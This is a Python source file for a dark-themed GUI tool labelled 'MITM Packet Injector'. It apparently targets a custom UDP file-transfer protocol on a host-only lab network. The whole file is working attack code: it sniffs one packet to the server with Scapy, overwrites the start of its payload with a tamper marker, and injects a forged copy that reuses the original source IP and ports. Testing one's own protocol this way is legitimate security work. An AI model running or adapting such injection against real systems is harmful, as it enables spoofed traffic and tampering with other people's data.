import threading
import time
import customtkinter as ctk
from collections import deque
from scapy.all import sniff, send, IP, UDP, Raw, Packet, bind_layers
from scapy.fields import ShortField, IntField

# --- Configuration ---
# Make sure these match your client/server configuration
LOOPBACK_INTERFACE = "eth0"  # Interface for Kali Linux
SERVER_IP = '192.168.56.1'   # The server's Host-Only IP
SERVER_DATA_PORT = 5001      # The port the server listens on for data

# region --- SCAPY & APP CONFIG ---
# Define the same protocol headers so Scapy can understand the packets
class FileTransferHeader(Packet):
    name = "FileTransferHeader"
    fields_desc = [ShortField("file_id", 0), IntField("chunk_offset", 0), ShortField("flags", 0)]
bind_layers(UDP, FileTransferHeader, dport=SERVER_DATA_PORT)
# endregion

class MitmApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        # --- APP STATE ---
        self.sniffer_thread = None
        self.is_sniffing = False
        self.ui_update_queue = deque()

        # --- WINDOW CONFIG ---
        self.title("MITM Packet Injector")
        self.geometry("600x400")
        self.configure(fg_color='#2D2D2D')
        self.resizable(False, False)
        ctk.set_appearance_mode("dark")

        # --- UI WIDGETS ---
        self.create_widgets()
        self.after(100, self.process_ui_queue)

    def create_widgets(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        header_label = ctk.CTkLabel(self, text="MITM Attack Tool", font=ctk.CTkFont(size=24, weight="bold"), text_color="#F44336")
        header_label.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

        log_frame = ctk.CTkFrame(self, fg_color="transparent")
        log_frame.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)

        self.log_area = ctk.CTkTextbox(log_frame, font=("Consolas", 12), border_width=1, fg_color="#242424")
        self.log_area.grid(row=0, column=0, sticky="nsew")
        self.log_area.tag_config('SUCCESS', foreground='#4CAF50')
        self.log_area.tag_config('ERROR', foreground='#F44336')
        self.log_area.tag_config('INFO', foreground='#2196F3')
        self.log_area.tag_config('WARN', foreground='#FFC107')
        self.log_area.tag_config('ATTACK', foreground='#E57373')

        self.toggle_button = ctk.CTkButton(self, text="Start 'One-Shot' Attack", height=40, command=self.start_attack, fg_color="#F44336", hover_color="#C62828")
        self.toggle_button.grid(row=2, column=0, padx=20, pady=20, sticky="ew")

    def log(self, message, level='INFO'):
        self.ui_update_queue.append((self._log_task, (message, level)))
    def _log_task(self, message, level):
        timestamp = time.strftime('%H:%M:%S')
        self.log_area.insert("end", f"[{timestamp}] ", "normal")
        self.log_area.insert("end", f"[{level}] ", (level.upper(),))
        self.log_area.insert("end", f"{message}\n", "normal")
        self.log_area.see("end")

    def process_ui_queue(self):
        for _ in range(len(self.ui_update_queue)):
            if not self.ui_update_queue: break
            func, args = self.ui_update_queue.popleft()
            func(*args)
        self.after(50, self.process_ui_queue)

    def start_attack(self):
        self.toggle_button.configure(state="disabled", text="Sniffing for 1 packet...")
        self.log(f"Starting 'one-shot' attack on interface '{LOOPBACK_INTERFACE}'...", "INFO")
        self.sniffer_thread = threading.Thread(target=self.run_sniffer, daemon=True)
        self.sniffer_thread.start()

    def run_sniffer(self):
        try:
            # Using count=1 tells Scapy to stop after capturing one matching packet.
            sniff(iface=LOOPBACK_INTERFACE,
                filter=f"udp and dst host {SERVER_IP} and port {SERVER_DATA_PORT}",
                prn=self.tamper_and_inject,
                count=1)
        except Exception as e:
            self.log(f"Sniffing error: {e}", "ERROR")
        
        # This will run after sniff has finished.
        self.log("Attack complete. Sniffer has stopped.", "SUCCESS")
        self.ui_update_queue.append((self.toggle_button.configure, (), {"state": "normal", "text": "Start 'One-Shot' Attack"}))

    def tamper_and_inject(self, packet):
        if Raw not in packet:
            self.log("Captured a packet with no payload, ignoring.", "WARN")
            return

        self.log(f"Packet captured! (ID: {packet[FileTransferHeader].file_id}, Offset: {packet[FileTransferHeader].chunk_offset})", "ATTACK")
        
        try:
            ip_layer, udp_layer, ft_header, payload = packet[IP], packet[UDP], packet[FileTransferHeader], packet[Raw].load
            
            tampered_payload = b"TAMPERED_BY_MITM" + payload[16:]
            
            malicious_packet = (IP(src=ip_layer.src, dst=ip_layer.dst) /
                                UDP(sport=udp_layer.sport, dport=udp_layer.dport) /
                                ft_header /
                                Raw(load=tampered_payload))
            
            send(malicious_packet, iface=LOOPBACK_INTERFACE, verbose=0)
            self.log("Tampered packet injected into the network!", "ATTACK")

        except Exception as e:
            self.log(f"Failed to tamper/inject packet: {e}", "ERROR")

if __name__ == "__main__":
    app = MitmApp()
    app.mainloop()